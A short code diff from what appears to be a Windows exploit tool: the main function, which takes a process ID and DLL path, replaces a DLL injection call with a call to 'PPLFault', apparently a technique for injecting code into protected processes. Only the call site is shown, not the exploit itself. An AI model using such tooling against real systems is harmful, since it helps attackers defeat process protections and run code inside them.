@@ -1,4 +1,5 @@
 #include "exploit.h"
+#include "PPLFault.h"
 
 #include <iostream>
 
@@ -17,7 +18,8 @@ int wmain(int argc, wchar_t* argv[])
 
     PrintArguments();
 
-	InjectDll(g_dwProcessId, g_pwszDllPath);
+	//InjectDll(g_dwProcessId, g_pwszDllPath);
+	PPLFault(g_dwProcessId, g_pwszDllPath);
 
     return 0;
 }
